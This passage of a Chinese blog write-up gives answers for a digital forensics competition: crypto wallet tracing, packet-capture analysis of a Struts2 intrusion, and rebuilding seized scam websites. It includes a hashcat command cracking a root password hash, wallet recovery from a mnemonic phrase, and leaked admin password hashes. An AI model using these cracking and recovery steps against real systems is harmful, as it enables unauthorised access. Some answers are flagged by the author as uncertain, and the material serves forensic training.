名称:根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)"></a>id:3 名称:根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)</h5><p>0x63AA203086938f82380A6A3521cCBf9c56d111eA</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427902.png" alt="image-20240929005757275"></p><h5 id="id-4-名称-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）"><a href="#id-4-名称-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）" class="headerlink" title="id:4 名称:根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）"></a>id:4 名称:根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）</h5><p>150.5</p><p>0.5</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427903.png" alt="image-20240929010237501"></p><p>50</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427904.png" alt="image-20240929010226075"></p><p>100</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427905.png" alt="image-20240929010203473"></p><h5 id="id-5-名称-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）"><a href="#id-5-名称-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）" class="headerlink" title="id:5 名称:在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）"></a>id:5 名称:在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）</h5><p>A.raw sausage art hub inspire dizzy funny exile local middle shed primary</p><p>B.raw sausage art hub inspire dizzy funny middle shed primary</p><p>C.raw sausage art funny exile local middle shed primary</p><p>A</p><p>助记词（也称为恢复短语或种子短语）通常由一系列单词组成，这些单词用于加密货币钱包中恢复账户。不同的钱包软件可能使用不同数量的单词，但常见的是12个、18个或24个单词。</p><h5 id="id-6-名称-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）"><a href="#id-6-名称-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）" class="headerlink" title="id:6 名称:假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）"></a>id:6 名称:假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）</h5><p>A.0xf0fF021880c4b1F79876E335c74d26DFa75DC9f9</p><p>B.0x63AA203086938f82380A6A3521cCBf9c56d111eA</p><p>C.0x0fd5F09C6Ba5Fd0aE6EbAFAF034913ACF7a0373A</p><p>B</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427906.png" alt="image-20240929010700835"></p><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><h5 id="id-1-名称-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）"><a href="#id-1-名称-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）" class="headerlink" title="id:1 名称:分析“数据包1.cap”，请问客户端为什么访问不了服务器。（  ）"></a>id:1 名称:分析“数据包1.cap”，请问客户端为什么访问不了服务器。（  ）</h5><p>A.DDoS攻击</p><p>B.DoS攻击</p><p>C.SQL注入</p><p>D.文档攻击</p><p>B</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427907.png" alt="image-20240929010928176"></p><h5 id="id-2-名称-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）"><a href="#id-2-名称-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）" class="headerlink" title="id:2 名称:分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）"></a>id:2 名称:分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）</h5><p>116.211.168.203</p><p>同上</p><h5 id="id-3-名称-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）"><a href="#id-3-名称-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）" class="headerlink" title="id:3 名称:分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）"></a>id:3 名称:分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）</h5><p>120.210.129.29</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427908.png" alt="image-20240929011551329"></p><h5 id="id-4-名称-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）"><a href="#id-4-名称-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）" class="headerlink" title="id:4 名称:分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）"></a>id:4 名称:分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）</h5><p>struts2</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427910.png" alt="image-20240928124547109"></p><h5 id="id-5-名称-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd"><a href="#id-5-名称-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd" class="headerlink" title="id:5 名称:分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)"></a>id:5 名称:分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)</h5><p>87540c645d003e6eebf1102e6f904197</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427911.png" alt="image-20240928133529469"></p><h5 id="id-6-名称-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-X-X-1-txt）"><a href="#id-6-名称-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-X-X-1-txt）" class="headerlink" title="id:6 名称:分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）"></a>id:6 名称:分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）</h5><p>C:&#x2F;Users&#x2F;Administrator&#x2F;Downloads&#x2F;新建文件夹&#x2F;新建文件夹&#x2F;mail.png</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427912.png" alt="image-20240928135507914"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427913.png" alt="image-20240928135611325"></p><h5 id="id-7-名称-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）"><a href="#id-7-名称-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）" class="headerlink" title="id:7 名称:分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）"></a>id:7 名称:分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）</h5><p>passwd</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427914.png" alt="image-20240928135505704"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427915.png" alt="image-20240928135448907"></p><h5 id="id-8-名称-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）"><a href="#id-8-名称-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）" class="headerlink" title="id:8 名称:分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）"></a>id:8 名称:分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）</h5><p>211625</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427916.png" alt="image-20240928135738467"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427917.png" alt="image-20240928135828632"></p><h4 id="服务器取证1"><a href="#服务器取证1" class="headerlink" title="服务器取证1"></a>服务器取证1</h4><h5 id="宝塔网站重构"><a href="#宝塔网站重构" class="headerlink" title="宝塔网站重构"></a>宝塔网站重构</h5><p>开始啥都不会显示，我这里更新了一下宝塔就好了，应该是我登录了自己的手机号，更新可以绕过</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427918.png" alt="image-20240928144400290"></p><p>添加hosts</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427919.png" alt="image-20240928145123612"></p><h6 id="wiiudot-cn"><a href="#wiiudot-cn" class="headerlink" title="wiiudot.cn"></a>wiiudot.cn</h6><p>首页显示错误</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427920.png" alt="image-20240928145036431"></p><p>修改配置文件，再看首页发现是数据库问题</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427921.png" alt="image-20240928145055398"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427922.png" alt="image-20240928145141320"></p><p>虽然配置文件全是连接47.98.13.21这个ip，但是服务器有本地数据库，改配置文件hostname为localhost就行</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427923.png" alt="image-20240928145454662"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427924.png" alt="image-20240928145700928"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427925.png" alt="image-20240928145708600"></p><p>修改数据库密码进后台，原密码9eb2b9ad495a75f80f9cf67ed08bbaae居然就是123456</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427926.png" alt="image-20240928150000652"></p><p>ok，成了一个</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427927.png" alt="image-20240928150102879"></p><h6 id="sb-wiiudot-cn"><a href="#sb-wiiudot-cn" class="headerlink" title="sb.wiiudot.cn"></a>sb.wiiudot.cn</h6><p>改完hostname首页依旧报错</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427928.png" alt="image-20240928150430762"></p><p>密码不对</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427929.png" alt="image-20240928151218005"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427930.png" alt="image-20240928151209843"></p><p>改个密码就好了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427931.png" alt="image-20240928151407548"></p><p>后台密码也改掉，原密码81dbdde41342ef4304ed3f0bf6041278，ok</p><h6 id="tf-chongwuxiaoyouxi-com"><a href="#tf-chongwuxiaoyouxi-com" class="headerlink" title="tf.chongwuxiaoyouxi.com"></a><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427932.png" alt="image-20240928151611252">tf.chongwuxiaoyouxi.com</h6><p>感觉路由有点问题，访问后台返回的是首页的页面</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427933.png" alt="image-20240928153434522"></p><p>看大佬博客可以copy另外两个网站的源码，然后改下数据库</p><h5 id="id-1-名称-服务器系统的版本号是-。-格式-1-1-1111"><a href="#id-1-名称-服务器系统的版本号是-。-格式-1-1-1111" class="headerlink" title="id:1 名称:服务器系统的版本号是_______。(格式:1.1.1111)"></a>id:1 名称:服务器系统的版本号是_______。(格式:1.1.1111)</h5><p> 7.9.2009</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427934.png" alt="image-20240928140800811"></p><h5 id="id-2-名称-网站数据库的版本号是-。-格式-1-1-1111"><a href="#id-2-名称-网站数据库的版本号是-。-格式-1-1-1111" class="headerlink" title="id:2 名称:网站数据库的版本号是_______。(格式:1.1.1111)"></a>id:2 名称:网站数据库的版本号是_______。(格式:1.1.1111)</h5><p>5.6.50</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427935.png" alt="image-20240928140825046"></p><h5 id="id-3-名称-宝塔面板的“超时”时间是-分钟。-格式-50"><a href="#id-3-名称-宝塔面板的“超时”时间是-分钟。-格式-50" class="headerlink" title="id:3 名称:宝塔面板的“超时”时间是_______分钟。(格式:50)"></a>id:3 名称:宝塔面板的“超时”时间是_______分钟。(格式:50)</h5><p>120</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427936.png" alt="image-20240928141657364"></p><h5 id="id-4-名称-网站源码备份压缩文件SHA256值是-。-格式-64位小写"><a href="#id-4-名称-网站源码备份压缩文件SHA256值是-。-格式-64位小写" class="headerlink" title="id:4 名称:网站源码备份压缩文件SHA256值是_______。(格式:64位小写)"></a>id:4 名称:网站源码备份压缩文件SHA256值是_______。(格式:64位小写)</h5><p> 0bdeeacf755126dae9efd38f6a6d70323aa95217b629fd389e0e81f9b406be39</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427937.png" alt="image-20240928142317995"></p><h5 id="id-5-名称-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd"><a href="#id-5-名称-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd" class="headerlink" title="id:5 名称:分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)"></a>id:5 名称:分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)</h5><p>lshi4AsSUrUOwWV</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427938.png" alt="image-20240928142902477"></p><h5 id="id-6-名称-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）"><a href="#id-6-名称-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）" class="headerlink" title="id:6 名称:分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）"></a>id:6 名称:分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）</h5><p>67277</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427939.png" alt="image-20240928154622527"></p><h5 id="id-7-名称-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复"><a href="#id-7-名称-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复" class="headerlink" title="id:7 名称:全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)"></a>id:7 名称:全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)</h5><p>506</p><p>错误答案：1017</p><p>732+85+200</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427940.png" alt="image-20240928155051469"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427941.png" alt="image-20240928155057837"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427942.png" alt="image-20240928155102737"></p><p>三个网站之间的数据不去重，单个网站内还是要去重</p><p>267+182+57</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427943.png" alt="image-20240929011919246"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427944.png" alt="image-20240929011936981"></p><h5 id="id-8-名称-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字"><a href="#id-8-名称-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字" class="headerlink" title="id:8 名称:分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)"></a>id:8 名称:分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)</h5><p>26</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427945.png" alt="image-20240928155403749"></p><h5 id="id-9-名称-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx"><a href="#id-9-名称-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx" class="headerlink" title="id:9 名称:分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)"></a>id:9 名称:分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)</h5><p>443074</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427946.png" alt="image-20240929012119885"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427947.png" alt="image-20240929012113853"></p><h5 id="id-10-名称-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx"><a href="#id-10-名称-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx" class="headerlink" title="id:10 名称:分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)"></a>id:10 名称:分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)</h5><p>KE5f3xnFHYAnG5Dt</p><p>错误答案：lSfXN770ZPjte9m</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427948.png" alt="image-20240928192309080"></p><p>忘记了我这里重构网站的时候这个密码是错的，被我改了，应该找备份文件的密码</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427949.png" alt="image-20240929012756831"></p><h4 id="服务器取证2"><a href="#服务器取证2" class="headerlink" title="服务器取证2"></a>服务器取证2</h4><h5 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h5><p>修改网站目录为根目录</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427950.png" alt="image-20240928220334028"></p><p>修改PHP版本为5.6或其他</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427951.png" alt="image-20240928220407662"></p><h5 id="id-1名称-请分析宝塔面板中默认建站目录是-。（标准格式：-etc-www）"><a href="#id-1名称-请分析宝塔面板中默认建站目录是-。（标准格式：-etc-www）" class="headerlink" title="id:1名称:请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）"></a>id:1名称:请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）</h5><p>&#x2F;home&#x2F;wwwroot</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427952.png" alt="image-20240928211300522"></p><h5 id="id-2-名称-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）"><a href="#id-2-名称-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）" class="headerlink" title="id:2 名称:在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）"></a>id:2 名称:在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）</h5><p>CHAR(128)</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427953.png" alt="image-20240929012949329"></p><h5 id="id-3-名称-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）"><a href="#id-3-名称-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）" class="headerlink" title="id:3 名称:请分析“乐享金融”网站绑定的域名是_______。（标准格式：www.baidu.com）"></a>id:3 名称:请分析“乐享金融”网站绑定的域名是_______。（标准格式：<a href="http://www.baidu.com)/">www.baidu.com）</a></h5><p>jinrong.goyasha.com</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427954.png" alt="image-20240928222034507"></p><h5 id="id-4-名称-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）"><a href="#id-4-名称-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）" class="headerlink" title="id:4 名称:请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）"></a>id:4 名称:请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）</h5><p>d2174d958131ebd43bf900e616a752e1</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427955.png" alt="image-20240928223418164"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427956.png" alt="image-20240928223328184"></p><h5 id="id-5-名称-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）"><a href="#id-5-名称-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）" class="headerlink" title="id:5 名称:请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）"></a>id:5 名称:请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）</h5><p>睿文化</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427957.png" alt="image-20240928223557584"></p><h5 id="id-6-名称-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）"><a href="#id-6-名称-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）" class="headerlink" title="id:6 名称:请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）"></a>id:6 名称:请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）</h5><p>2</p><p>错误答案：4</p><p>cid为5的是外汇产品，还有4个产品是删除了的，如果算上删除的是4个</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427958.png" alt="image-20240928225047121"></p><h5 id="id-7-名称-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"><a href="#id-7-名称-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）" class="headerlink" title="id:7 名称:请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"></a>id:7 名称:请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）</h5><p>85CF33F97B46A88C7386286D0270CB3E</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427959.png" alt="image-20240928225141659"></p><h5 id="id-8-名称-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）"><a href="#id-8-名称-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）" class="headerlink" title="id:8 名称:请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）"></a>id:8 名称:请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）</h5><p>答案不确定：6470314</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427960.png" alt="image-20240928225516144"></p><h5 id="id-9-名称-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）"><a href="#id-9-名称-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）" class="headerlink" title="id:9 名称:请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）"></a>id:9 名称:请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）</h5><p>kongxin</p><p>错误答案：张教瘦</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427961.png" alt="image-20240928225547087"></p><p>对应的userid的username是kongxin</p><h5 id="id-10-名称-请分析“乐享金融”建仓时间为“2022-03-01-18-44-01”，平仓时间为“2022-03-01-18-52-01”，以太坊-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）"><a href="#id-10-名称-请分析“乐享金融”建仓时间为“2022-03-01-18-44-01”，平仓时间为“2022-03-01-18-52-01”，以太坊-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）" class="headerlink" title="id:10 名称:请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）"></a>id:10 名称:请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）</h5><p>2896.924</p><p>建仓时间1646131441平仓时间1646131921</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427962.png" alt="image-20240928230007791"></p><h5 id="id-11-名称-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）"><a href="#id-11-名称-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）" class="headerlink" title="id:11 名称:请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）"></a>id:11 名称:请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）</h5><p>1639014743</p><p>宝塔备份文件里有，直接查查不到</p><h5 id="id-12-名称-宝塔面板某用户曾尝试进行一次POST请求，参数为“-BTCloud-action-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。"><a href="#id-12-名称-宝塔面板某用户曾尝试进行一次POST请求，参数为“-BTCloud-action-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。" class="headerlink" title="id:12 名称:宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（  ）电脑系统进行访问请求的。"></a>id:12 名称:宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（  ）电脑系统进行访问请求的。</h5><p>A.Windows 8.1</p><p>B.Windows 10</p><p>C.Windows 11</p><p>D.Windows Server 2000</p><p>A</p><p>在&#x2F;www&#x2F;server&#x2F;panel&#x2F;logs&#x2F;request下有备份日志</p><h5 id="id-13-名称-请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）"><a href="#id-13-名称-请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）" class="headerlink" title="id:13 名称:请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）"></a>id:13 名称:请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）</h5><p>g123123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat  -a 0 $1$kmYU/aog$fKIF3ugewwCTuPWOSksjD/ rockyou.txt --force --self-test-disable</span><br></pre></td></tr></table></figure><p>cmd5查是付费记录</p><h2 id="2024龙信杯"><a href="#2024龙信杯" class="headerlink" title="2024龙信杯"></a>2024龙信杯</h2><h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><p>感谢发wp的大佬和群里的大佬</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzNTQzNTQzMQ==&mid=2247485094&idx=1&sn=6f3ccd09248bcdee6c304e867a2b7e03&chksm=c3b74ce61e8809a7ea3d00f61a408c37c7c23d806aa50d404b9e0b2941b172f13f203224b058&mpshare=1&scene=23&srcid=1001QQpePLtLpBVYVwX7STLu&sharer_shareinfo=4248da169227d1862f1ba202dd5ce9f2&sharer_shareinfo_first=4248da169227d1862f1ba202dd5ce9f2#rd">第二届 龙信杯 电子数据取证竞赛部分Writeup——ZhangZ</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNTYyMzg0NQ==&mid=2247484353&idx=1&sn=926a53b89f4b7cb041da969f10fd1144&chksm=c0c7059729e76847b693c4e8d243ebc8db70093aa920b67c0084c31f42bd8db20c143ba48db7&mpshare=1&scene=23&srcid=1003nrjIGgGBtCNj3ePV96s7&sharer_shareinfo=83e36f1a566815a143b47a2a0f426655&sharer_shareinfo_first=83e36f1a566815a143b47a2a0f426655#rd">龙信杯wannacry勒索病毒分析——zzzyg</a></p><p><a href="https://mp.weixin.qq.com/s/kF2IUdCOrRturQGz1moq0w">2024第二届“龙信杯”电子数据取证竞赛部分wp[仅供参考]——zero宇灏</a></p><p><a 